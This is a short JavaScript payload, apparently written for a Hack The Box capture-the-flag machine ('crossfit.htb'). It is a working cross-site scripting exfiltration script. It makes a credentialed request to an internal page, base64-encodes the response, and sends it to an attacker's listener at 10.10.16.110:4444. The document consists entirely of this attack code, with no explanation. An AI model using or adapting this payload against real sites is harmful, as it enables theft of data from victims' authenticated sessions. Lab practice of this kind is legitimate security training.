myhttpserver = 'http://10.10.16.110:4444/'
targeturl = 'http://development-test.crossfit.htb/rc.php'



req = new XMLHttpRequest;
req.withCredentials = true;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
        req2 = new XMLHttpRequest;
        req2.open('GET', myhttpserver + btoa(this.responseText), false);
        req2.send();
    }
}
req.open('GET', targeturl, false);
req.send();
